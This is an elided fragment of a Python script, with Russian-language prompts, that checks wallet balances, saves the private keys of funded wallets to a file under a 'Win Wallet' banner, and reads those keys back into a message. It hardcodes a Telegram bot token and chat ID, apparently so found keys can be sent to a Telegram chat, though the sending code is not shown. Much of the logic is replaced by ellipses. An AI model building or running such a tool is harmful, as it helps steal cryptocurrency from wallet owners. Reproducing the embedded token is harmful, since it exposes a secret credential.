...
console = Console()
console.clear()
TOKEN = "5796008235:AAH-_tQrPtmZGq2ABiAY7JA9_4kORu9zFtY"
chat_id = "354735723" 


filexname = input('вставить имя файла <---------|без .txt|----------> : ')
#
def Bal(address) :
...
def psz() :
    ...
    for i in range(0 , len(mylist)) :
        ...
        if int(bal) > 0 :
            ...
            f1 = open(u"v7_"+str(filexname)+"_KEy.txt" , "a") 
            f1.write('\n'+private_key)
            f1.close()
            console.print(Panel(str(pszPanel) , title = "[white]Win Wallet [/]" , subtitle = "[green_yellow blink] psz.com [/]" , style = "red") , style = style , justify = "full")
            ...
            if str(val) != str(ifbtc) :
                ...
                console.print(Panel(str(pszB) , title = "[white]Win Wallet [/]" , subtitle = "[green_yellow blink] psz.Com [/]" , style = "green") , style = style , justify = "full")

                f = open(u"v7_"+str(filexname)+"_Balance.txt" , "a")
...
thr = threading.Thread(target = psz , args = ())
thr.start()
thr.join()

f = open(u"v7_"+str(filexname)+"_KEy.txt")
message = (f.read())
...
print('[green_yellow blink] All DONE ')